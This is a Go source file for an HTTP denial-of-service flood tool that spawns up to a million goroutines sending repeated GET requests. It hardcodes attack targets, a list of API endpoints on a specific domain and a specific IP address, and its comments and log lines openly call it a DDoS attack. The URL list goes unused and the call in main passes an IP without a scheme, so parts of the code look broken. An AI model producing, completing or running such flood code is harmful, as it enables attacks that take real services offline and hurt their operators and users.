package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"sync/atomic"
	"time"
)

/**
*
* ddos
* <p>
* ddos file
*
* Copyright (c) 2024 All rights reserved.
*
* This source code is protected by copyright and may not be reproduced,
* distributed, modified, or used in any form without the express written
* permission of the copyright owner.
*
* @author bxcode
* @author dbacilio88@outlook.es
* @since 5/08/2024
*
 */
const (
	// Número de goroutines para usar para hacer las peticiones HTTP
	numWorkers = 1000000
	// Número de peticiones a hacer
	numRequests = 1000000
	// Timeout para las peticiones HTTP
	requestTimeout = 1 * time.Second
)

var urls = []string{
	"https://wewrf.com/m/index",
	"https://wewrf.com/api/poster/notice",
	"https://wewrf.com/api/banner/1/list",
	"https://wewrf.com/api/banner/5/list",
	"https://wewrf.com/api/commission/list",
	"https://wewrf.com/api/userLevel/list",
	"https://wewrf.com/api/poster/homeList",
}

type DDoS struct {
	url           string
	stop          *chan bool
	amountWorkers int

	// Statistic
	successRequest int64

	amountRequests int64
}

func New(URL string, workers int) (*DDoS, error) {
	if workers < 1 {
		return nil, fmt.Errorf("amount of workers cannot be less 1")
	}
	u, err := url.Parse(URL)
	if err != nil || len(u.Host) == 0 {
		return nil, fmt.Errorf("undefined host or error = %v", err)
	}
	s := make(chan bool)
	return &DDoS{
		url:           URL,
		stop:          &s,
		amountWorkers: workers,
	}, nil
}

// Run - run DDoS attack
func (d *DDoS) Run() {
	for i := 0; i < d.amountWorkers; i++ {
		go func() {
			for {
				select {
				case <-(*d.stop):
					return
				default:
					// sent http GET requests
					log.Println("url ", d.url)
					resp, err := http.Get(d.url)
					atomic.AddInt64(&d.amountRequests, 1)
					if err == nil {
						atomic.AddInt64(&d.successRequest, 1)
						_, _ = io.Copy(ioutil.Discard, resp.Body)
						_ = resp.Body.Close()
					}
				}
				runtime.Gosched()
			}
		}()
	}
}
func (d *DDoS) Stop() {
	for i := 0; i < d.amountWorkers; i++ {
		*d.stop <- true
	}
	close(*d.stop)
}

// Result - result of DDoS attack
func (d *DDoS) Result() (successRequest, amountRequests int64) {
	return d.successRequest, d.amountRequests
}

func main() {
	d, err := New("180.178.49.118", numWorkers)
	if err != nil {
		log.Fatalf("Error creating dos.New: %s", err)
		return
	}
	d.Run()
	time.Sleep(requestTimeout)
	d.Stop()
	log.Println("data ", os.Stdout, "attack server ddos")
}
